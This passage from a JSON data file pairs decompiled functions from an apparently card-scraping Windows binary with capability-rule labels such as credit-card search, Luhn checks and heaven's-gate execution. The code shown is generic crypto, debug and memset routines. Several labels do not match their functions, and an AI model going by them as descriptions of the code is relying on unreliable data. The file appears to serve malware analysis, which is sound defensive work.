arg_8h[0x23] ^ uVar5;\n        arg_8h[0x2c] = uVar12 ^ arg_8h[0x2c] ^ uVar3;\n        arg_8h[0x2d] = uVar6 ^ arg_8h[0x2d] ^ uVar5;\n        uVar3 = uVar11 << 1 | uVar13 >> 0x1f;\n        uVar5 = uVar11 >> 0x1f | uVar13 * 2;\n        arg_8h[6] = arg_8h[6] ^ uVar5 ^ uVar9;\n        arg_8h[7] = arg_8h[7] ^ uVar3 ^ uVar7;\n        arg_8h[0x10] = uVar5 ^ arg_8h[0x10] ^ uVar9;\n        arg_8h[0x11] = uVar3 ^ arg_8h[0x11] ^ uVar7;\n        arg_8h[0x1a] = uVar5 ^ arg_8h[0x1a] ^ uVar9;\n        arg_8h[0x1b] = uVar3 ^ arg_8h[0x1b] ^ uVar7;\n        arg_8h[0x24] = uVar5 ^ arg_8h[0x24] ^ uVar9;\n        arg_8h[0x25] = uVar3 ^ arg_8h[0x25] ^ uVar7;\n        arg_8h[0x2e] = uVar5 ^ arg_8h[0x2e] ^ uVar9;\n        arg_8h[0x2f] = uVar3 ^ arg_8h[0x2f] ^ uVar7;\n        uVar3 = uVar4 << 1 | uVar2 >> 0x1f;\n        uVar2 = uVar4 >> 0x1f | uVar2 * 2;\n        arg_8h[8] = uVar2 ^ arg_8h[8] ^ uVar10;\n        arg_8h[9] = uVar3 ^ arg_8h[9] ^ uVar8;\n        arg_8h[0x12] = arg_8h[0x12] ^ uVar2 ^ uVar10;\n        arg_8h[0x13] = arg_8h[0x13] ^ uVar3 ^ uVar8;\n        arg_8h[0x1c] = uVar2 ^ arg_8h[0x1c] ^ uVar10;\n        arg_8h[0x1d] = uVar3 ^ arg_8h[0x1d] ^ uVar8;\n        arg_8h[0x26] = uVar2 ^ arg_8h[0x26] ^ uVar10;\n        arg_8h[0x27] = uVar3 ^ arg_8h[0x27] ^ uVar8;\n        arg_8h[0x30] = uVar2 ^ arg_8h[0x30] ^ uVar10;\n        arg_8h[0x31] = uVar3 ^ arg_8h[0x31] ^ uVar8;\n        uVar2 = arg_8h[0x14];\n        uVar3 = arg_8h[0x15];\n        arg_8h[0x14] = arg_8h[3] >> 0x1f | arg_8h[2] * 2;\n        arg_8h[0x15] = arg_8h[3] << 1 | arg_8h[2] >> 0x1f;\n        uVar4 = arg_8h[0xe];\n        uVar5 = arg_8h[0xf];\n        arg_8h[0xf] = uVar3 << 3 | uVar2 >> 0x1d;\n        arg_8h[0xe] = uVar3 >> 0x1d | uVar2 << 3;\n        uVar2 = arg_8h[0x16];\n        uVar3 = arg_8h[0x17];\n        arg_8h[0x16] = uVar5 >> 0x1a | uVar4 << 6;\n        arg_8h[0x17] = uVar5 << 6 | uVar4 >> 0x1a;\n        uVar4 = arg_8h[0x22];\n        uVar5 = arg_8h[0x23];\n        arg_8h[0x22] = uVar3 >> 0x16 | uVar2 << 10;\n        arg_8h[0x23] = uVar3 << 10 | uVar2 >> 0x16;\n        uVar2 = arg_8h[0x24];\n        uVar3 = arg_8h[0x25];\n        arg_8h[0x24] = uVar5 >> 0x11 | uVar4 << 0xf;\n        arg_8h[0x25] = uVar5 << 0xf | uVar4 >> 0x11;\n        uVar4 = arg_8h[6];\n        uVar5 = arg_8h[7];\n        arg_8h[6] = uVar3 >> 0xb | uVar2 << 0x15;\n        arg_8h[7] = uVar3 << 0x15 | uVar2 >> 0xb;\n        uVar2 = arg_8h[10];\n        uVar3 = arg_8h[0xb];\n        arg_8h[10] = uVar5 >> 4 | uVar4 << 0x1c;\n        arg_8h[0xb] = uVar5 << 0x1c | uVar4 >> 4;\n        uVar4 = arg_8h[0x20];\n        uVar5 = arg_8h[0x21];\n        arg_8h[0x21] = uVar2 << 4 | uVar3 >> 0x1c;\n        arg_8h[0x20] = uVar2 >> 0x1c | uVar3 << 4;\n        uVar2 = arg_8h[0x10];\n        uVar3 = arg_8h[0x11];\n        arg_8h[0x11] = uVar4 << 0xd | uVar5 >> 0x13;\n        arg_8h[0x10] = uVar4 >> 0x13 | uVar5 << 0xd;\n        uVar4 = arg_8h[0x2a];\n        uVar5 = arg_8h[0x2b];\n        arg_8h[0x2b] = uVar2 << 0x17 | uVar3 >> 9;\n        arg_8h[0x2a] = uVar2 >> 9 | uVar3 << 0x17;\n        uVar2 = arg_8h[0x30];\n        uVar3 = arg_8h[0x31];\n        arg_8h[0x30] = uVar5 >> 0x1e | uVar4 << 2;\n        arg_8h[0x31] = uVar5 << 2 | uVar4 >> 0x1e;\n        uVar4 = arg_8h[8];\n        uVar5 = arg_8h[9];\n        arg_8h[8] = uVar3 >> 0x12 | uVar2 << 0xe;\n        arg_8h[9] = uVar3 << 0xe | uVar2 >> 0x12;\n        uVar2 = arg_8h[0x1e];\n        uVar3 = arg_8h[0x1f];\n        arg_8h[0x1e] = uVar5 >> 5 | uVar4 << 0x1b;\n        arg_8h[0x1f] = uVar5 << 0x1b | uVar4 >> 5;\n        uVar4 = arg_8h[0x2e];\n        uVar5 = arg_8h[0x2f];\n        arg_8h[0x2f] = uVar2 << 9 | uVar3 >> 0x17;\n        arg_8h[0x2e] = uVar2 >> 0x17 | uVar3 << 9;\n        uVar2 = arg_8h[0x26];\n        uVar3 = arg_8h[0x27];\n        arg_8h[0x27] = uVar4 << 0x18 | uVar5 >> 8;\n        arg_8h[0x26] = uVar4 >> 8 | uVar5 << 0x18;\n        uVar4 = arg_8h[0x1a];\n        uVar5 = arg_8h[0x1b];\n        arg_8h[0x1a] = uVar3 >> 0x18 | uVar2 << 8;\n        arg_8h[0x1b] = uVar3 << 8 | uVar2 >> 0x18;\n        uVar2 = arg_8h[0x18];\n        uVar3 = arg_8h[0x19];\n        arg_8h[0x18] = uVar5 >> 7 | uVar4 << 0x19;\n        arg_8h[0x19] = uVar5 << 0x19 | uVar4 >> 7;\n        uVar4 = arg_8h[4];\n        uVar5 = arg_8h[5];\n        arg_8h[5] = uVar2 << 0xb | uVar3 >> 0x15;\n        arg_8h[4] = uVar2 >> 0x15 | uVar3 << 0xb;\n        uVar2 = arg_8h[0x28];\n        uVar3 = arg_8h[0x29];\n        arg_8h[0x28] = uVar4 >> 2 | uVar5 << 0x1e;\n        arg_8h[0x29] = uVar4 << 0x1e | uVar5 >> 2;\n        uVar4 = arg_8h[0x1c];\n        uVar5 = arg_8h[0x1d];\n        arg_8h[0x1c] = uVar3 >> 0xe | uVar2 << 0x12;\n        arg_8h[0x1d] = uVar3 << 0x12 | uVar2 >> 0xe;\n        uVar2 = arg_8h[0x2c];\n        uVar3 = arg_8h[0x2d];\n        arg_8h[0x2c] = uVar4 >> 0x19 | uVar5 << 7;\n        arg_8h[0x2d] = uVar4 << 7 | uVar5 >> 0x19;\n        uVar4 = arg_8h[0x12];\n        uVar5 = arg_8h[0x13];\n        arg_8h[0x13] = uVar2 << 0x1d | uVar3 >> 3;\n        arg_8h[0x12] = uVar2 >> 3 | uVar3 << 0x1d;\n        uVar2 = arg_8h[0xc];\n        uVar3 = arg_8h[0xd];\n        arg_8h[0xc] = uVar5 >> 0xc | uVar4 << 0x14;\n        arg_8h[0xd] = uVar5 << 0x14 | uVar4 >> 0xc;\n        arg_8h[2] = uVar2 >> 0x14 | uVar3 << 0xc;\n        arg_8h[3] = uVar2 << 0xc | uVar3 >> 0x14;\n        uVar2 = *arg_8h;\n        uVar3 = arg_8h[2];\n        uVar4 = arg_8h[6];\n        uVar5 = arg_8h[4];\n        uVar6 = arg_8h[5];\n        uVar7 = arg_8h[1];\n        uVar8 = arg_8h[3];\n        uVar9 = arg_8h[7];\n        uVar10 = arg_8h[8];\n        uVar11 = arg_8h[9];\n        *arg_8h = ~uVar3 & uVar5 ^ uVar2;\n        arg_8h[1] = ~uVar8 & uVar6 ^ uVar7;\n        arg_8h[2] = ~uVar5 & uVar4 ^ uVar3;\n        arg_8h[3] = ~uVar6 & uVar9 ^ uVar8;\n        arg_8h[5] = ~uVar9 & uVar11 ^ uVar6;\n        arg_8h[4] = ~uVar4 & uVar10 ^ uVar5;\n        arg_8h[7] = ~uVar11 & uVar7 ^ uVar9;\n        arg_8h[6] = ~uVar10 & uVar2 ^ uVar4;\n        arg_8h[9] = ~uVar7 & uVar8 ^ uVar11;\n        arg_8h[8] = ~uVar2 & uVar3 ^ uVar10;\n        uVar2 = arg_8h[10];\n        uVar3 = arg_8h[0xc];\n        uVar4 = arg_8h[0x10];\n        uVar5 = arg_8h[0xe];\n        uVar6 = arg_8h[0xf];\n        uVar7 = arg_8h[0xb];\n        uVar8 = arg_8h[0xd];\n        uVar9 = arg_8h[0x11];\n        uVar10 = arg_8h[0x12];\n        uVar11 = arg_8h[0x13];\n        arg_8h[10] = ~uVar3 & uVar5 ^ uVar2;\n        arg_8h[0xb] = ~uVar8 & uVar6 ^ uVar7;\n        arg_8h[0xc] = ~uVar5 & uVar4 ^ uVar3;\n        arg_8h[0xd] = ~uVar6 & uVar9 ^ uVar8;\n        arg_8h[0xf] = ~uVar9 & uVar11 ^ uVar6;\n        arg_8h[0xe] = ~uVar4 & uVar10 ^ uVar5;\n        arg_8h[0x10] = ~uVar10 & uVar2 ^ uVar4;\n        arg_8h[0x11] = ~uVar11 & uVar7 ^ uVar9;\n        arg_8h[0x12] = ~uVar2 & uVar3 ^ uVar10;\n        arg_8h[0x13] = ~uVar7 & uVar8 ^ uVar11;\n        uVar2 = arg_8h[0x14];\n        uVar3 = arg_8h[0x16];\n        uVar4 = arg_8h[0x1a];\n        uVar5 = arg_8h[0x18];\n        uVar6 = arg_8h[0x19];\n        uVar7 = arg_8h[0x15];\n        uVar8 = arg_8h[0x17];\n        uVar9 = arg_8h[0x1b];\n        uVar10 = arg_8h[0x1c];\n        uVar11 = arg_8h[0x1d];\n        arg_8h[0x14] = ~uVar3 & uVar5 ^ uVar2;\n        arg_8h[0x15] = ~uVar8 & uVar6 ^ uVar7;\n        arg_8h[0x16] = ~uVar5 & uVar4 ^ uVar3;\n        arg_8h[0x17] = ~uVar6 & uVar9 ^ uVar8;\n        arg_8h[0x18] = ~uVar4 & uVar10 ^ uVar5;\n        arg_8h[0x19] = ~uVar9 & uVar11 ^ uVar6;\n        arg_8h[0x1a] = ~uVar10 & uVar2 ^ uVar4;\n        arg_8h[0x1b] = ~uVar11 & uVar7 ^ uVar9;\n        arg_8h[0x1c] = ~uVar2 & uVar3 ^ uVar10;\n        arg_8h[0x1d] = ~uVar7 & uVar8 ^ uVar11;\n        uVar2 = arg_8h[0x1e];\n        uVar3 = arg_8h[0x20];\n        uVar4 = arg_8h[0x24];\n        uVar5 = arg_8h[0x22];\n        uVar6 = arg_8h[0x23];\n        uVar7 = arg_8h[0x1f];\n        uVar8 = arg_8h[0x21];\n        uVar9 = arg_8h[0x25];\n        uVar10 = arg_8h[0x26];\n        uVar11 = arg_8h[0x27];\n        arg_8h[0x1e] = ~uVar3 & uVar5 ^ uVar2;\n        arg_8h[0x1f] = ~uVar8 & uVar6 ^ uVar7;\n        arg_8h[0x20] = ~uVar5 & uVar4 ^ uVar3;\n        arg_8h[0x21] = ~uVar6 & uVar9 ^ uVar8;\n        arg_8h[0x22] = ~uVar4 & uVar10 ^ uVar5;\n        arg_8h[0x23] = ~uVar9 & uVar11 ^ uVar6;\n        arg_8h[0x24] = ~uVar10 & uVar2 ^ uVar4;\n        arg_8h[0x25] = ~uVar11 & uVar7 ^ uVar9;\n        arg_8h[0x26] = ~uVar2 & uVar3 ^ uVar10;\n        arg_8h[0x27] = ~uVar7 & uVar8 ^ uVar11;\n        uVar2 = arg_8h[0x28];\n        uVar3 = arg_8h[0x2a];\n        uVar4 = arg_8h[0x2c];\n        uVar5 = arg_8h[0x2e];\n        uVar6 = arg_8h[0x29];\n        uVar7 = arg_8h[0x2d];\n        uVar8 = arg_8h[0x2b];\n        uVar9 = arg_8h[0x2f];\n        uVar10 = arg_8h[0x30];\n        uVar11 = arg_8h[0x31];\n        arg_8h[0x28] = ~uVar3 & uVar4 ^ uVar2;\n        arg_8h[0x29] = ~uVar8 & uVar7 ^ uVar6;\n        arg_8h[0x2a] = ~uVar4 & uVar5 ^ uVar3;\n        arg_8h[0x2b] = ~uVar7 & uVar9 ^ uVar8;\n        arg_8h[0x2c] = ~uVar5 & uVar10 ^ uVar4;\n        arg_8h[0x2d] = ~uVar9 & uVar11 ^ uVar7;\n        arg_8h[0x2e] = ~uVar10 & uVar2 ^ uVar5;\n        arg_8h[0x2f] = ~uVar11 & uVar6 ^ uVar9;\n        arg_8h[0x30] = ~uVar2 & uVar3 ^ uVar10;\n        arg_8h[0x31] = ~uVar6 & uVar8 ^ uVar11;\n        *arg_8h = *arg_8h ^ *var_28h;\n        puVar1 = var_28h + 1;\n        var_28h = var_28h + 2;\n        arg_8h[1] = arg_8h[1] ^ *puVar1;\n    } while (var_28h < 0x4129b0);\n    return;\n}\n",
        "token_count": 6304
    },
    "00404e50": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404e50(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t arg_10h;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint unaff_EDI;\n    uint uVar7;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_8h != 0) && (arg_ch != 0)) {\n        uVar3 = arg_ch + 0xfU & 0xfffffff0;\n        uVar6 = 0;\n        if (0 < uVar3) {\n            do {\n                if ((uVar6 & 0xf) == 0) {\n                    fcn.00405082(7, L\"      %p  \", uVar6 + arg_8h);\n                }\n                if (uVar6 < arg_ch) {\n                    uVar1 = *(uVar6 + arg_8h);\n                    if ((uVar1 < 0x20) || (0x7e < uVar1)) {\n                        uVar7 = 8;\n                    }\n                    else {\n                        uVar7 = 2;\n                    }\n                    fcn.00405082(uVar7, L\"%02x\", uVar1);\n                }\n                else {\n                    fcn.00405082(0, 0x40fb20, unaff_EDI);\n                }\n                fcn.00405082(0, 0x40fb28, unaff_EDI);\n                if ((uVar6 & 7) == 7) {\n                    fcn.00405082(0, 0x40fb28, unaff_EDI);\n                }\n                if ((uVar6 & 0xf) == 0xf) {\n                    fcn.00405082(8, 0x40fb2c, unaff_EDI);\n                    uVar1 = *((uVar6 - 0xf) + arg_8h);\n                    iVar4 = uVar6 - 0xf;\n                    while (uVar5 = uVar1,  iVar4 <= uVar6) {\n                        if (iVar4 < arg_ch) {\n                            arg_10h = 0x2e;\n                            if (uVar5 - 0x20 < 0x5f) {\n                                arg_10h = uVar5;\n                            }\n                            fcn.00405082((-(0x5e < uVar5 - 0x20) & 6) + 2, 0x40fb30, arg_10h);\n                        }\n                        else {\n                            fcn.00405082(0, 0x40fb28, unaff_EDI);\n                        }\n                        iVar4 = iVar4 + 1;\n                        uVar1 = *(iVar4 + arg_8h);\n                    }\n                    fcn.00405082(8, 0x40fb38, unaff_EDI);\n                }\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < uVar3);\n        }\n        fcn.00405082(0, 0x40fb40, unaff_EDI);\n        return;\n    }\n    uVar7 = 0x4216a0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    fcn.00405082(0xc, L\"[ERR] \", uVar7);\n    fcn.00405082(4, 0x40fb44, arg_8h);\n    fcn.00405082(4, L\"      %S:%S:%lu\\r\\n\", \"D:\\\\1\\\\core\\\\src\\\\common\\\\debug.c\");\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    uVar7 = fcn.00404e30();\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(uVar7);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 889
    },
    "0040df64": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040dfa5)\n// WARNING: Removing unreachable block (ram,0x0040e055)\n// WARNING: Removing unreachable block (ram,0x0040dfdf)\n\nuint fcn.0040df64(void)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t in_XCR0;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x4214c0 = 0;\n    *0x421330 = *0x421330 | 1;\n    iVar4 = sub.KERNEL32.dll_IsProcessorFeaturePresent(10);\n    uVar3 = *0x421330;\n    if (iVar4 != 0) {\n        var_10h = 0;\n        *0x421330 = *0x421330 | 2;\n        *0x4214c0 = 1;\n        piVar1 = cpuid_basic_info(0);\n        puVar2 = cpuid_Version_info(1);\n        uVar6 = puVar2[3];\n        if (((piVar1[2] ^ 0x49656e69U | piVar1[3] ^ 0x6c65746eU | piVar1[1] ^ 0x756e6547U) == 0) &&\n           (((((uVar5 = *puVar2 & 0xfff3ff0,  uVar5 == 0x106c0 || (uVar5 == 0x20660)) || (uVar5 == 0x20670)) ||\n             ((uVar5 == 0x30650 || (uVar5 == 0x30660)))) || (uVar5 == 0x30670)))) {\n            *0x4214c4 = *0x4214c4 | 1;\n        }\n        if (6 < *piVar1) {\n            iVar4 = cpuid_Extended_Feature_Enumeration_info(7);\n            var_10h = *(iVar4 + 4);\n            if ((var_10h & 0x200) != 0) {\n                *0x4214c4 = *0x4214c4 | 2;\n            }\n        }\n        if ((uVar6 & 0x100000) != 0) {\n            *0x421330 = uVar3 | 6;\n            *0x4214c0 = 2;\n            if ((((uVar6 & 0x8000000) != 0) && ((uVar6 & 0x10000000) != 0)) && ((in_XCR0 & 6) == 6)) {\n                *0x421330 = uVar3 | 0xe;\n                *0x4214c0 = 3;\n                if ((var_10h & 0x20) != 0) {\n                    *0x421330 = uVar3 | 0x2e;\n                    *0x4214c0 = 5;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 760
    },
    "004067b6": {
        "rules": [
            "parse credit card information/f44d27b3cce043409e5315cf54d1899b",
            "search for credit card data/ac143e9ae29c414184a69c9308e24693"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004067b6(int16_t *arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*arg_8h == 0x5e) {\n        uVar2 = fcn.004067fa(arg_8h + 1, arg_ch);\n    }\n    else {\n        do {\n            iVar3 = fcn.004067fa(arg_8h, arg_ch);\n            if (iVar3 != 0) {\n                return 1;\n            }\n            iVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n        } while (iVar1 != 0);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 174
    },
    "0040524d": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0040524d(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    \n    if (arg_10h != 0) {\n        piVar2 = arg_8h;\n        for (uVar1 = arg_10h >> 2; uVar1 != 0; uVar1 = uVar1 - 1) {\n            *piVar2 = arg_ch * 0x1010101;\n            piVar2 = piVar2 + 1;\n        }\n        for (arg_10h = arg_10h & 3; arg_10h != 0; arg_10h = arg_10h - 1) {\n            *piVar2 = arg_ch * 0x1010101;\n            piVar2 = piVar2 + 1;\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 218
    },
    "00405c6b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00405c6b(void)\n\n{\n    uint var_24h;\n    \n    (**0x413dc0)(&var_24h);\n    return var_24h == 9;\n}\n",
        "token_count": 56
    },
    "004066e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004066e6(uint arg_8h)\n\n{\n    if (('\\b' < arg_8h) && ((arg_8h < '\\x0e' || (arg_8h == ' ')))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 66
    },
    "00406701": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406701(uint arg_8h)\n\n{\n    if ((8 < arg_8h) && ((arg_8h < 0xe || (arg_8h == 0x20)))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 63
    },
    "0040601d": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040601d(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_58h;\n    uint var_2h;\n    \n    fcn.00406625(0x420aa0, 0x33, 7, 0x56, &var_58h);\n    var_2h._0_2_ = 0;\n    uVar2 = 0;\n    *0x42136c = (**0x413c2c)(0, 0, &var_58h);\n    if (*0x42136c != 0) {\n        iVar1 = (**0x413d60)();\n        if (iVar1 == 0xb7) {\n            uVar2 = 1;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 203
    },
    "004095ab": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004095ab(uint32_t *arg_8h, int32_t arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t *puVar7;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    uVar2 = *arg_10h;\n    uVar5 = arg_10h[1];\n    uVar3 = (uVar2 >> 8 & 0xff00ff00 | uVar2 << 0x18 | (uVar2 & 0xff00) << 8 | uVar2 >> 0x18) ^ *arg_8h;\n    uVar2 = arg_10h[2];\n    uVar4 = (uVar5 >> 8 & 0xff00ff00 | uVar5 << 0x18 | (uVar5 & 0xff00) << 8 | uVar5 >> 0x18) ^ arg_8h[1];\n    uVar5 = arg_10h[3];\n    uVar6 = (uVar2 >> 8 & 0xff00ff00 | uVar2 << 0x18 | (uVar2 & 0xff00) << 8 | uVar2 >> 0x18) ^ arg_8h[2];\n    uVar5 = (uVar5 >> 8 & 0xff00ff00 | uVar5 << 0x18 | (uVar5 & 0xff00) << 8 | uVar5 >> 0x18) ^ arg_8h[3];\n    var_8h = *((uVar5 >> 0x10 & 0xff) * 4 + 0x4118c8) ^ *((uVar6 >> 8 & 0xff) * 4 + 0x411cc8) ^\n             *((uVar3 >> 0x18) * 4 + 0x4114c8) ^ *((uVar4 & 0xff) * 4 + 0x4120c8) ^ arg_8h[4];\n    arg_10h = *((uVar5 >> 8 & 0xff) * 4 + 0x411cc8) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x4118c8) ^\n              *((uVar4 >> 0x18) * 4 + 0x4114c8) ^ *((uVar6 & 0xff) * 4 + 0x4120c8) ^ arg_8h[5];\n    uVar2 = *((uVar6 >> 0x10 & 0xff) * 4 + 0x4118c8) ^ *((uVar4 >> 8 & 0xff) * 4 + 0x411cc8) ^\n            *((uVar5 >> 0x18) * 4 + 0x4114c8) ^ *((uVar3 & 0xff) * 4 + 0x4120c8) ^ arg_8h[7];\n    arg_ch = arg_ch >> 1;\n    puVar1 = arg_8h;\n    arg_8h = *((uVar4 >> 0x10 & 0xff) * 4 + 0x4118c8) ^ *((uVar3 >> 8 & 0xff) * 4 + 0x411cc8) ^\n             *((uVar6 >> 0x18) * 4 + 0x4114c8) ^ *((uVar5 & 0xff) * 4 + 0x4120c8) ^ arg_8h[6];\n    while( true ) {\n        arg_ch = arg_ch + -1;\n        puVar7 = puVar1 + 8;\n        if (arg_ch == 0) break;\n        uVar5 = *((uVar2 >> 0x10 & 0xff) * 4 + 0x4118c8) ^ *((arg_8h >> 8 & 0xff) * 4 + 0x411cc8) ^\n                *((var_8h >> 0x18) * 4 + 0x4114c8) ^ *((arg_10h & 0xff) * 4 + 0x4120c8) ^ *puVar7;\n        uVar3 = *((uVar2 >> 8 & 0xff) * 4 + 0x411cc8) ^ *((var_8h >> 0x10 & 0xff) * 4 + 0x4118c8) ^\n                *((arg_10h >> 0x18) * 4 + 0x4114c8) ^ *((arg_8h & 0xff) * 4 + 0x4120c8) ^ puVar1[9];\n        uVar4 = *((arg_10h >> 0x10 & 0xff) * 4 + 0x4118c8) ^ *((var_8h >> 8 & 0xff) * 4 + 0x411cc8) ^\n                *((arg_8h >> 0x18) * 4 + 0x4114c8) ^ *((uVar2 & 0xff) * 4 + 0x4120c8) ^ puVar1[10];\n        uVar2 = *((arg_8h >> 0x10 & 0xff) * 4 + 0x4118c8) ^ *((arg_10h >> 8 & 0xff) * 4 + 0x411cc8) ^\n                *((uVar2 >> 0x18) * 4 + 0x4114c8) ^ *((var_8h & 0xff) * 4 + 0x4120c8) ^ puVar1[0xb];\n        var_8h = *((uVar2 >> 0x10 & 0xff) * 4 + 0x4118c8) ^ *((uVar4 >> 8 & 0xff) * 4 + 0x411cc8) ^\n                 *((uVar5 >> 0x18) * 4 + 0x4114c8) ^ *((uVar3 & 0xff) * 4 + 0x4120c8) ^ puVar1[0xc];\n        arg_10h = *((uVar2 >> 8 & 0xff) * 4 + 0x411cc8) ^ *((uVar5 >> 0x10 & 0xff) * 4 + 0x4118c8) ^\n                  *((uVar3 >> 0x18) * 4 + 0x4114c8) ^ *((uVar4 & 0xff) * 4 + 0x4120c8) ^ puVar1[0xd];\n        arg_8h = *((uVar3 >> 0x10 & 0xff) * 4 + 0x4118c8) ^ *((uVar5 >> 8 & 0xff) * 4 + 0x411cc8) ^\n                 *((uVar4 >> 0x18) * 4 + 0x4114c8) ^ *((uVar2 & 0xff) * 4 + 0x4120c8) ^ puVar1[0xe];\n        uVar2 = *((uVar4 >> 0x10 & 0xff) * 4 + 0x4118c8) ^ *((uVar3 >> 8 & 0xff) * 4 + 0x411cc8) ^\n                *((uVar2 >> 0x18) * 4 + 0x4114c8) ^ *((uVar5 & 0xff) * 4 + 0x4120c8) ^ puVar1[0xf];\n        puVar1 = puVar7;\n    }\n    uVar5 = *(str.RRRR_t_t_t_tjjjj + (uVar2 >> 0x10 & 0xff) * 4) & 0xff0000 ^\n            *(str.RRRR_t_t_t_tjjjj + (arg_8h >> 8 & 0xff) * 4) & 0xff00 ^\n            *(str.RRRR_t_t_t_tjjjj + (var_8h >> 0x18) * 4) & 0xff000000 ^ str.RRRR_t_t_t_tjjjj[(arg_10h & 0xff) * 4] ^\n            *puVar7;\n    *arg_14h = uVar5 >> 8 & 0xff00ff00 | uVar5 << 0x18 | (uVar5 & 0xff00) << 8 | uVar5 >> 0x18;\n    uVar5 = *(str.RRRR_t_t_t_tjjjj + (var_8h >> 0x10 & 0xff) * 4) & 0xff0000 ^\n            *(str.RRRR_t_t_t_tjjjj + (uVar2 >> 8 & 0xff) * 4) & 0xff00 ^\n            *(str.RRRR_t_t_t_tjjjj + (arg_10h >> 0x18) * 4) & 0xff000000 ^ str.RRRR_t_t_t_tjjjj[(arg_8h & 0xff) * 4] ^\n            puVar1[9];\n    arg_14h[1] = uVar5 >> 8 & 0xff00ff00 | uVar5 << 0x18 | (uVar5 & 0xff00) << 8 | uVar5 >> 0x18;\n    uVar5 = *(str.RRRR_t_t_t_tjjjj + (arg_10h >> 0x10 & 0xff) * 4) & 0xff0000 ^\n            *(str.RRRR_t_t_t_tjjjj + (var_8h >> 8 & 0xff) * 4) & 0xff00 ^\n            *(str.RRRR_t_t_t_tjjjj + (arg_8h >> 0x18) * 4) & 0xff000000 ^ str.RRRR_t_t_t_tjjjj[(uVar2 & 0xff) * 4] ^\n            puVar1[10];\n    arg_14h[2] = uVar5 >> 8 & 0xff00ff00 | uVar5 << 0x18 | (uVar5 & 0xff00) << 8 | uVar5 >> 0x18;\n    uVar2 = *(str.RRRR_t_t_t_tjjjj + (arg_8h >> 0x10 & 0xff) * 4) & 0xff0000 ^\n            *(str.RRRR_t_t_t_tjjjj + (arg_10h >> 8 & 0xff) * 4) & 0xff00 ^\n            *(str.RRRR_t_t_t_tjjjj + (uVar2 >> 0x18) * 4) & 0xff000000 ^ str.RRRR_t_t_t_tjjjj[(var_8h & 0xff) * 4] ^\n            puVar1[0xb];\n    arg_14h[3] = uVar2 >> 8 & 0xff00ff00 | uVar2 << 0x18 | (uVar2 & 0xff00) << 8 | uVar2 >> 0x18;\n    return;\n}\n",
        "token_count": 2611
    },
    "00409acb": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
